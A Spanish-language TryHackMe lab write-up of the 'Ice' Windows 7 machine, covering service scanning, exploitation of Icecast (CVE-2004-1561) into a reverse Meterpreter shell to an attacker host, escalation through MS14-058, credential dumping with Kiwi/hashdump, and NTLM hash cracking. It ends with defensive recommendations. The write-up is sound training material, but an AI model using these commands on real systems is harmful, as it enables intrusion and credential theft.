---
layout: ../../layouts/WriteupLayout.astro
category: ctf
title: "Ice | TryHackMe"
description: "Resolución documentada de la máquina Ice: explotación de Icecast, migración de procesos, escalada mediante MS14-058 y extracción de credenciales."
---

# Ice | TryHackMe

> Write-up de laboratorio sobre una máquina Windows con Icecast expuesto y varias rutas de escalada local.

## Resumen de la ruta


Durante el ejercicio se utilizan los marcadores `$TARGET_IP` y `$ATTACKER_IP` para no fijar la dirección de una infraestructura concreta.

## 1. Reconocimiento de servicios

Empiezo con un escaneo completo para no limitar la búsqueda a los puertos habituales:

```bash
nmap -p- -T4 --min-rate 1000 --open --max-retries 2 $TARGET_IP
```

El objetivo responde y muestra la siguiente superficie TCP:

```text
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5357/tcp  open  wsdapi
8000/tcp  open  http-alt
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49160/tcp open  unknown
49184/tcp open  unknown
```

Los puertos superiores a `49000` son coherentes con puertos dinámicos utilizados por RPC en Windows. El servicio que requiere una revisión específica es `8000/tcp`, ya que es un puerto habitual de Icecast.

Lanzo un segundo escaneo centrado en los servicios identificados:

```bash
nmap -sC -sV -p 135,139,445,5357,8000 $TARGET_IP
```

La detección devuelve estos datos relevantes:

| Puerto | Servicio | Información |
| ---: | --- | --- |
| `135` | MSRPC | Microsoft Windows RPC |
| `139` | NetBIOS | NetBIOS sobre TCP |
| `445` | SMB | Windows 7 Professional SP1 |
| `5357` | HTTPAPI | SSDP/UPnP de Windows |
| `8000` | Icecast | Servidor multimedia en streaming |

También se identifican el equipo `DARK-PC`, el grupo de trabajo `WORKGROUP` y una instalación de Windows 7 Professional con arquitectura x64.

## 2. Acceso inicial mediante Icecast

El servicio de Icecast permite ejecutar código remotamente en versiones antiguas debido a un desbordamiento al procesar cabeceras HTTP. La vulnerabilidad está registrada como **CVE-2004-1561**.

Uso el módulo disponible en Metasploit:

```text
use exploit/windows/http/icecast_header
set RHOSTS $TARGET_IP
set LHOST $ATTACKER_IP
run
```

La sesión inversa se abre con el payload predeterminado:

```text
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] Started reverse TCP handler on $ATTACKER_IP:4444
[*] Sending stage (203455 bytes) to $TARGET_IP
[*] Meterpreter session 1 opened ($ATTACKER_IP:4444 -> $TARGET_IP:49222)
```

Compruebo el contexto de la sesión:

```text
getuid
sysinfo
```

```text
Server username: Dark-PC\Dark

Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

El proceso explotado es de 32 bits, por lo que Meterpreter se inicia como `x86/windows` aunque el sistema operativo sea x64.

## 3. Preparación de la sesión

Antes de probar módulos locales, conviene que la sesión coincida con la arquitectura del sistema. Enumero los procesos disponibles:

```text
ps
```

Entre ellos aparece `taskhost.exe`, ejecutándose como `Dark` y con arquitectura x64:

```text
 PID   PPID  Name          Arch  Session  User          Path
 1300  1020  dwm.exe       x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1320  692   explorer.exe  x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1488  692   taskhost.exe  x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1996  1320  Icecast2.exe  x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
```

Migro la sesión al proceso `taskhost.exe`:

```text
migrate 1488
sysinfo
```

```text
[*] Migrating from 1996 to 1488...
[*] Migration completed successfully.

Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
Meterpreter     : x64/windows
```

La sesión ya está alineada con la arquitectura del sistema y puede utilizar módulos x64.

## 4. Escalada de privilegios con MS14-058

La elevación automática con `getsystem` no funciona porque UAC está activo. Para buscar alternativas locales ejecuto el sugeridor de exploits:

```text
run post/multi/recon/local_exploit_suggester
```

Entre las opciones detectadas aparece el módulo asociado a **MS14-058**:

```text
[+] exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
```

Elijo `ms14_058_track_popup_menu`, que aprovecha una vulnerabilidad de `win32k.sys`. Configuro el objetivo y el payload para x64:

```text
use exploit/windows/local/ms14_058_track_popup_menu
set SESSION 1
set LHOST $ATTACKER_IP
set target 1
set payload windows/x64/meterpreter/reverse_tcp
run
```

El exploit crea una segunda sesión:

```text
[*] Reflectively injecting the exploit DLL and triggering the exploit...
[*] Launching netsh to host the DLL...
[+] Process 3516 launched.
[*] Reflectively injecting the DLL into 3516...
[*] Sending stage (255679 bytes) to $TARGET_IP
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 2 opened ($ATTACKER_IP:4444 -> $TARGET_IP:49240)
```

Verifico los permisos obtenidos:

```text
getuid
```

```text
Server username: NT AUTHORITY\SYSTEM
```

La sesión ya tiene el nivel máximo de privilegios local.

## 5. Migración a un proceso estable

Para trabajar con procesos del sistema, migro la sesión a `spoolsv.exe`, que se ejecuta como `SYSTEM` y pertenece a la arquitectura x64:

```text
migrate -N spoolsv.exe
```

```text
[*] Migrating from 3516 to 1396...
[*] Migration completed successfully.
```

## 6. Credenciales almacenadas en memoria

Con privilegios `SYSTEM`, cargo Kiwi, la integración de Metasploit con Mimikatz:

```text
load kiwi
```

```text
Loading extension kiwi...
Success.
```

Solicito todas las credenciales disponibles:

```text
creds_all
```

La memoria de LSASS contiene credenciales asociadas a la cuenta `Dark`:

```text
msv credentials
===============
Username  Domain   NTLM
--------  ------   ----
Dark      Dark-PC  $DARK_HASH

wdigest credentials
===================
Username  Domain     Password
--------  ------     --------
Dark      Dark-PC    $DARK_PASSWORD
```

Los valores sensibles se representan mediante placeholders para no publicar credenciales reales del laboratorio.

También puedo obtener los hashes locales:

```text
hashdump
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:$DARK_HASH:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

El formato es:

```text
usuario:RID:LM_hash:NT_hash:::
```

Guardo el hash de `Dark` y lo pruebo contra `rockyou.txt`:

```bash
echo "$DARK_HASH" > dark_hash.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt dark_hash.txt
```

El resultado del laboratorio indica que la contraseña aparece en la wordlist:

```text
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
$DARK_PASSWORD      (?)
1g 0:00:00:00 DONE
```

## Conclusiones

La máquina muestra una cadena de ataque muy dependiente del mantenimiento del sistema:

1. Icecast expuesto permite obtener una primera sesión sin autenticación.
2. La sesión inicial es de 32 bits y debe migrarse a un proceso x64.
3. Windows 7 es vulnerable a una escalada local mediante MS14-058.
4. La sesión `SYSTEM` permite acceder a credenciales almacenadas en memoria.
5. La contraseña de `Dark` resulta débil frente a una wordlist pública.

Las medidas defensivas principales serían actualizar Icecast y Windows, limitar la exposición del servicio multimedia, aplicar UAC correctamente, evitar credenciales reutilizadas y proteger LSASS frente a la extracción de secretos.

## Referencias

- [CVE-2004-1561 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2004-1561)
- [MS14-058 - Microsoft Security Bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-058)
- [CVE-2014-4113 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2014-4113)
- [Metasploit Framework](https://www.metasploit.com/)
- [Mimikatz / Kiwi](https://github.com/gentilkiwi/mimikatz)
